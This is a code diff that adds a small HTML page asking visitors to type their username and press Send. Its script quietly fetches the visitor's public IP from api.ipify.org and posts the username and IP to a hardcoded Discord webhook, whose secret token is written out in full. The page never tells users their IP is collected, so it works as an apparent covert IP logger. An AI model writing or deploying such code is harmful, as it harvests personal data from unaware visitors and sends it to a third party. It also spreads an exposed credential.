@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send Textbox Content</title>
+    <style>
+        #inputBox {
+            border: 1px solid #ccc;
+            padding: 10px;
+            width: 300px;
+        }
+        #inputBox.green-border {
+            border-color: green;
+        }
+    </style>
+</head>
+<body>
+    <input type="text" id="inputBox" placeholder="Type username here...">
+    <button id="sendButton">Send</button>
+
+    <script>
+        document.getElementById('inputBox').addEventListener('input', function() {
+            if (this.value.trim() !== "") {
+                this.classList.add('green-border');
+            } else {
+                this.classList.remove('green-border');
+            }
+        });
+
+        document.getElementById('sendButton').addEventListener('click', function() {
+            var content = document.getElementById('inputBox').value.trim();
+            if (content === "") {
+                alert("please enter your username.");
+                return;
+            }
+
+
+            fetch('https://api.ipify.org?format=json') // amm
+                .then(response => response.json())
+                .then(data => {
+                    var userIp = data.ip;
+                    var payload = {
+                        content: `Textbox content: ${content}\nUser IP: ${userIp}`
+                    };
+
+
+                    fetch('https://discord.com/api/webhooks/1264345023491735612/PhNW10WDYOLVaEC2fehza-FVDP8rw22i20wDEvhOc31P_JxfG7kAX8BXUI9Z6wfc4rYE', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    }).then(response => {
+                        if (response.ok) {
+                            alert("content sent successfully!");
+                        } else {
+                            alert("failed to send content.");
+                        }
+                    }).catch(error => {
+                        console.error('Error:', error);
+                        alert("failed to send content.");
+                    });
+                }).catch(error => {
+                    console.error('Error fetching IP:', error);
+                    alert("fail");
+                });
+        });
+    </script>
+</body>
+</html>
